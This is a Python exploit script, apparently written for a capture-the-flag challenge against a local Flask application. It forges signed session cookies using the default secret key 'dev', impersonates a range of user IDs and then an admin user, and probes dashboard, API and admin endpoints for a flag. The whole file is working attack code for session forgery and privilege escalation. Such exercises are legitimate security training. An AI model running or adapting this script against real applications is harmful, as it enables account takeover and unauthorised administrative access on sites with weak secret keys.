import requests
import re
from itsdangerous import URLSafeTimedSerializer
import hashlib

# Target URL
base_url = "http://127.0.0.1:32883"

# Working secret key
secret_key = 'dev'

def forge_flask_session(secret_key, session_data):
    """Forge a Flask session cookie"""
    try:
        serializer = URLSafeTimedSerializer(
            secret_key,
            salt='cookie-session',
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
        )
        forged_cookie = serializer.dumps(session_data)
        return forged_cookie
    except Exception as e:
        print(f"[!] Error forging session: {e}")
        return None

print("[*] Testing dashboard with different URL structures")
print("="*80)

# Try different user_ids
test_user_ids = [0, 1, 2, 100, 1000, 10000]

found_flag = False

for user_id in test_user_ids:
    if found_flag:
        break
        
    # Forge session for this user_id
    session_data = {'user_id': user_id}
    forged_cookie = forge_flask_session(secret_key, session_data)
    
    if not forged_cookie:
        continue
        
    cookies = {'session': forged_cookie}
    
    # Try different URL patterns
    url_patterns = [
        f"{base_url}/dashboard",
        f"{base_url}/dashboard/{user_id}",
        f"{base_url}/dashboard?user_id={user_id}",
        f"{base_url}/user/{user_id}/dashboard",
        f"{base_url}/api/user/{user_id}",
        f"{base_url}/api/users/{user_id}",
    ]
    
    for url in url_patterns:
        try:
            response = requests.get(url, cookies=cookies, allow_redirects=True, timeout=5)
            
            # Look for FLAG pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            
            # Report interesting responses
            if response.status_code == 200 and (flag_match or len(response.text) > 2000 or 'welcome' in response.text.lower()):
                print(f"\n[+] user_id={user_id} | URL: {url}")
                print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
                
                if flag_match:
                    print(f"[!] FLAG FOUND: {flag_match.group(0)}")
                    print(f"[+] Full Response:\n{response.text}")
                    found_flag = True
                    break
                elif len(response.text) > 2000:
                    print(f"[+] Response preview:\n{response.text[:800]}")
                    
        except Exception as e:
            pass  # Ignore errors, just try next

if not found_flag:
    print("\n[-] No flag found with URL parameter variations")
    
    # Try one more thing - maybe there's an admin-specific endpoint that works with forged session
    print("\n[*] Testing admin-specific endpoints with forged admin session")
    
    admin_session = {'user_id': 1, 'user_type': 'admin'}
    forged_cookie = forge_flask_session(secret_key, admin_session)
    cookies = {'session': forged_cookie}
    
    admin_endpoints = [
        '/admin',
        '/administrator',
        '/backend',
        '/manage',
        '/panel',
    ]
    
    for endpoint in admin_endpoints:
        try:
            url = f"{base_url}{endpoint}"
            response = requests.get(url, cookies=cookies, allow_redirects=True, timeout=5)
            
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            
            if response.status_code == 200 or flag_match:
                print(f"\n[+] Endpoint: {endpoint}")
                print(f"[+] Status: {response.status_code} | Length: {len(response.content)}B")
                
                if flag_match:
                    print(f"[!] FLAG FOUND: {flag_match.group(0)}")
                    print(f"[+] Full Response:\n{response.text}")
                    break
                else:
                    print(f"[+] Response preview:\n{response.text[:500]}")
        except Exception as e:
            pass

